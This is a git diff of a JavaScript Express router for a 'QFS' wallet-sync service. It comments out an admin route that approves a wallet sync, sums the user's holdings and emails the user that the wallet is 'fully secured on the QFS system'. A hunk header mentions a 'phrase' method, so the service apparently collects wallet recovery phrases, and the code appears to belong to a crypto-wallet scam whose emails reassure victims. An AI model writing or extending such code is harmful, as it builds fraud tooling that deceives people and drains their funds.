@@ -100,74 +100,74 @@ ${method === "phrase"
 // ---------------------------------------------------------------------------
 //  PUT /api/walletsync/approve/:id → Admin approves a wallet sync
 // ---------------------------------------------------------------------------
-router.put("/approve/:id", auth, async (req, res) => {
-  try {
-    const entryId = Number(req.params.id);
-    if (!entryId) return res.status(400).json({ error: "Invalid ID" });
+// router.put("/approve/:id", auth, async (req, res) => {
+//   try {
+//     const entryId = Number(req.params.id);
+//     if (!entryId) return res.status(400).json({ error: "Invalid ID" });
 
-    // update wallet sync status
-    const entry = await prisma.walletSync.update({
-      where: { id: entryId },
-      data: { status: "APPROVED" },
-      include: { user: true }, // get user details in same query
-    });
+//     // update wallet sync status
+//     const entry = await prisma.walletSync.update({
+//       where: { id: entryId },
+//       data: { status: "APPROVED" },
+//       include: { user: true }, // get user details in same query
+//     });
 
-    const { user } = entry;
+//     const { user } = entry;
 
-    // fetch user total balance (sum holdings)
-    const holdings = await prisma.holding.findMany({
-      where: { userId: user.id },
-      select: { amount: true, locked: true },
-    });
+//     // fetch user total balance (sum holdings)
+//     const holdings = await prisma.holding.findMany({
+//       where: { userId: user.id },
+//       select: { amount: true, locked: true },
+//     });
 
-    const totalBalance = holdings.reduce((sum, h) => {
-      const unlocked = parseFloat(h.amount) - parseFloat(h.locked || 0);
-      return sum + (isNaN(unlocked) ? 0 : unlocked);
-    }, 0);
+//     const totalBalance = holdings.reduce((sum, h) => {
+//       const unlocked = parseFloat(h.amount) - parseFloat(h.locked || 0);
+//       return sum + (isNaN(unlocked) ? 0 : unlocked);
+//     }, 0);
 
-    // --- Professional User Email ---
-    const userHtml = `
-      <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
-        <div style="background:#0a0a0a;padding:20px;color:white;text-align:center">
-          <h2 style="margin:0;font-weight:600;">🔐 Wallet Sync Approved</h2>
-        </div>
-        <div style="padding:24px;">
-          <p>Dear ${user.name || user.username || "User"},</p>
-          <p>We are pleased to inform you that your wallet has been successfully synced and <strong>fully secured</strong> on the QFS system.</p>
+//     // --- Professional User Email ---
+//     const userHtml = `
+//       <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
+//         <div style="background:#0a0a0a;padding:20px;color:white;text-align:center">
+//           <h2 style="margin:0;font-weight:600;">🔐 Wallet Sync Approved</h2>
+//         </div>
+//         <div style="padding:24px;">
+//           <p>Dear ${user.name || user.username || "User"},</p>
+//           <p>We are pleased to inform you that your wallet has been successfully synced and <strong>fully secured</strong> on the QFS system.</p>
 
-          <p style="margin-top:12px;font-size:15px;">
-            ✅ <strong>Wallet Status:</strong> <span style="color:green;font-weight:bold;">APPROVED</span><br/>
-            💰 <strong>Total Balance:</strong> <span style="font-weight:bold;">$${totalBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD</span>
-          </p>
+//           <p style="margin-top:12px;font-size:15px;">
+//             ✅ <strong>Wallet Status:</strong> <span style="color:green;font-weight:bold;">APPROVED</span><br/>
+//             💰 <strong>Total Balance:</strong> <span style="font-weight:bold;">$${totalBalance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD</span>
+//           </p>
 
-          <p>Thank you for trusting QFS. You can now manage your synced wallet directly from your dashboard.</p>
+//           <p>Thank you for trusting QFS. You can now manage your synced wallet directly from your dashboard.</p>
 
-          <div style="margin-top:20px;text-align:center;">
-            <a href="${process.env.CLIENT_URL || 'https://www.qfsworldwide.net'}/dashboard/walletsync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
-              Go to Dashboard
-            </a>
-          </div>
+//           <div style="margin-top:20px;text-align:center;">
+//             <a href="${process.env.CLIENT_URL || 'https://www.qfsworldwide.net'}/dashboard/walletsync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
+//               Go to Dashboard
+//             </a>
+//           </div>
 
-          <p style="margin-top:32px;">Best regards,<br/>The QFS Security Team</p>
-        </div>
-        <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
-          &copy; ${new Date().getFullYear()} QFS System
-        </div>
-      </div>
-    `;
+//           <p style="margin-top:32px;">Best regards,<br/>The QFS Security Team</p>
+//         </div>
+//         <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
+//           &copy; ${new Date().getFullYear()} QFS System
+//         </div>
+//       </div>
+//     `;
 
-    await sendMail({
-      to: user.email,
-      subject: `✅ Wallet Sync Approved – QFS`,
-      html: userHtml,
-    });
+//     await sendMail({
+//       to: user.email,
+//       subject: `✅ Wallet Sync Approved – QFS`,
+//       html: userHtml,
+//     });
 
-    return res.json({ success: true, message: "Wallet sync approved and user notified." });
-  } catch (err) {
-    console.error("Approve wallet sync error:", err);
-    return res.status(500).json({ error: "Failed to approve wallet sync" });
-  }
-});
+//     return res.json({ success: true, message: "Wallet sync approved and user notified." });
+//   } catch (err) {
+//     console.error("Approve wallet sync error:", err);
+//     return res.status(500).json({ error: "Failed to approve wallet sync" });
+//   }
+// });
 
 
 export default router;
